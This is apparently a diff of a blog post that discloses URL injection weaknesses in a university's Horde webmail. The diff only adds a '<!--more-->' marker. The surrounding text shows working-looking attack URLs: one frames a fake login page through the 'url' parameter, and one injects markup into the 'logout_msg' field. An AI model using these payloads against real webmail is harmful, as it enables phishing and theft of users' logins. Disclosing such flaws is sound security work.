@@ -30,6 +30,7 @@ As the horde server had encountered several url injection problems, we made a li
 2. Fake login frame:  It require user to login to the real webmail first, and then we insert a login frame in the content.
 [ https://webmail1.ie.cuhk.edu.hk/horde/index.php?url=http://personal.ie.cuhk.edu.hk/~tks008/iewebmail.html](https://webmail1.ie.cuhk.edu.hk/horde/index.php?url=http://personal.ie.cuhk.edu.hk/~tks008/iewebmail.html)
 
+<!--more-->
 3. Injection start here: We can insert our bad script at the original notice message
 <a href="https://webmail1.ie.cuhk.edu.hk/horde/imp/login.php?logout_reason=message&logout_msg=HEHEHEHE
 </td>.............................</tr><tr >
